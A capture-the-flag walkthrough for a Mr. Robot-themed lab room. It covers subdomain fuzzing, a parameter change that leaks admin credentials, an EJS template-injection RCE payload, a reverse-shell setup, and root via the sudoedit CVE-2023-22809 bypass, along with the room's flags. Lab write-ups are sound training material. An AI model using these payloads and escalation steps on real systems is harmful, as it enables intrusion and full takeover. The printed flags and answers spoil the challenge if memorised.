---

## 🧠 Summary

This room is based on Mr. Robot and explores topics like virtual host enumeration, login panel access, SSTI exploitation in EJS templates, and privilege escalation through a sudoedit vulnerability (CVE-2023-22809).  
We’ll go from web enumeration all the way to getting root via environment variable abuse.

---

## 🔍 Enumeration

Run a full TCP scan:

```bash
nmap -p- -T4 -A MACHINE_IP -vvv
````

### Open Ports

* **22/tcp** – SSH
* **80/tcp** – HTTP

![Screenshot From 2025-05-13 11-02-44](https://github.com/user-attachments/assets/7df9d6ec-91ba-485a-9aac-ecbc5703956e)

---

## 🌐 Web Enumeration

Check the page at `http://cyprusbank.thm`. Not much useful there.

Use `ffuf` for subdomain fuzzing:

```bash
ffuf -u http://cyprusbank.thm/ -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Interesting findings:**

* `admin.cyprusbank.thm` – Returns **302 Redirect**

Add this to `/etc/hosts`:

```
MACHINE_IP  admin.cyprusbank.thm
```

![Screenshot From 2025-05-13 11-12-08](https://github.com/user-attachments/assets/88928e06-1c80-411c-bb28-c2953469b6d3)

---

## 🔑 Login Panel

Visit: `http://admin.cyprusbank.thm`

Try the given credentials:

* **Username:** Olivia Cortez
* **Password:** olivi8

✅ Success! You’re logged in.

Check the **Messages** tab:
URL looks like:

```
http://admin.cyprusbank.thm/messages/?c=5
```

Try manipulating the `?c=5` parameter to `?c=0`.

![Screenshot From 2025-05-13 11-15-08](https://github.com/user-attachments/assets/bf8013f3-0fe5-4ec8-b2aa-d8337a8f5000)

![Screenshot From 2025-05-13 11-22-08](https://github.com/user-attachments/assets/ecc6bfcf-e010-43d2-b86c-99d1e096c167)

You’ll find:

> **Admin Username:** Gayle Bev
> 
> **Password:** `p~]P5!6;rs558:q`

---

## ☎️ Find Tyrell's Phone Number

After logging in as **Gayle Bev**, you’ll find a phone number:

**Answer:** `842-029-5701`

---

## 🔥 XSS + SSTI Discovery

In **Settings**, you can add a user and see the password reflected back – likely a candidate for **XSS** or **SSTI**.

Using Burp Suite to intercept the POST request, we see evidence of **EJS** templates.

![Screenshot From 2025-05-13 11-30-43](https://github.com/user-attachments/assets/14169de9-15de-49b3-9bb8-648c480761bf)

---

## ⚙️ Exploiting EJS Server-Side Template Injection

### Resource:

[https://eslam.io/posts/ejs-server-side-template-injection-rce](https://eslam.io/posts/ejs-server-side-template-injection-rce)

Use Burp Suite with the payload:

```bash
name=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').exec('COMMAND')
```

![Screenshot From 2025-05-13 11-58-25](https://github.com/user-attachments/assets/5f57b7db-7321-4546-a1ad-6a3542471668)

![Screenshot From 2025-05-13 11-58-57](https://github.com/user-attachments/assets/38bb71ae-f573-4719-8497-6211a739da84)


### Reverse Shell Payload (Base64-encoded BusyBox)

Set up a listener:

```bash
nc -lnvp 4445
```

Inject payload:

```bash
name=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo <REPLACE WITH YOURS> | base64 -d | bash"');//
```

![Screenshot From 2025-05-13 12-06-07](https://github.com/user-attachments/assets/28d495b6-5ed5-40b6-a929-6facacc36e64)

![Screenshot From 2025-05-13 12-15-22](https://github.com/user-attachments/assets/f9703a21-5bc3-4e78-936e-832a9c16b0b7)


Get a shell and stabilize:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![Screenshot From 2025-05-13 12-21-34](https://github.com/user-attachments/assets/bf5b3fb7-8d4e-4288-9f5e-c093743a4946)


---

## 🏁 User Flag

> Location: `/home/web/user.txt`

**Flag:**

```
THM{4lways_upd4te_uR_d3p3nd3nc!3s}
```

---

## 🔼 Privilege Escalation (CVE-2023-22809)

Run:

```bash
sudo -l
```

Findings:

```bash
(web) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Exploit via `EDITOR` environment variable:

```bash
export EDITOR='nano -- /etc/sudoers'
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Add this line:

```bash
web ALL=(ALL) NOPASSWD: ALL
```
![image](https://github.com/user-attachments/assets/e48f3828-8ad2-46ac-a0a9-2b4dd0d4ebfb)

```
web@cyprusbank:~/app$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
    (ALL) NOPASSWD: ALL
```

Get root:

```bash
sudo su -
```
![Screenshot From 2025-05-12 21-18-11 - Edited](https://github.com/user-attachments/assets/890e3b8c-712e-4132-addc-eee6e519bf10)

---

## 🧾 Root Flag

> Location: `/root/root.txt`

**Flag:**

```
THM{4nd_uR_p4ck4g3s}
```

---

## ✅ Conclusion

* Enumerated virtual hosts with ffuf
* Found and used user and admin credentials
* Exploited SSTI in EJS templates for RCE
* Gained root via CVE-2023-22809 (sudoedit bypass)

**Lesson:** Always validate template inputs and keep your packages up to date.

```

Let me know if you want me to create the full file and upload it for GitHub directly.
```
